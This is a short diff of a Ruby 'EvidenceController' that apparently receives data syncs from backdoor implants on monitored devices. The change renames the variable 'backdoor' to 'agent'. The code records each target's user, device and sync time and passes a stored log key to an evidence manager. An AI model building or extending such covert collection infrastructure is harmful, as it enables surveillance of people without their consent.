@@ -52,8 +52,8 @@ class EvidenceController < RESTController
     session = @params.symbolize
     
     # retrieve the key from the db
-    backdoor = Item.where({_id: session[:bid]}).first
-    key = backdoor[:logkey]
+    agent = Item.where({_id: session[:bid]}).first
+    key = agent[:logkey]
     
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
@@ -62,11 +62,11 @@ class EvidenceController < RESTController
     EvidenceManager.instance.sync_start session, @params['version'], @params['user'], @params['device'], @params['source'], time.to_i, key
 
     # update the stats
-    backdoor.stat[:last_sync] = time
-    backdoor.stat[:source] = @params['source']
-    backdoor.stat[:user] = @params['user']
-    backdoor.stat[:device] = @params['device']
-    backdoor.save
+    agent.stat[:last_sync] = time
+    agent.stat[:source] = @params['source']
+    agent.stat[:user] = @params['user']
+    agent.stat[:device] = @params['device']
+    agent.save
     
     return RESTController.reply.ok
   end
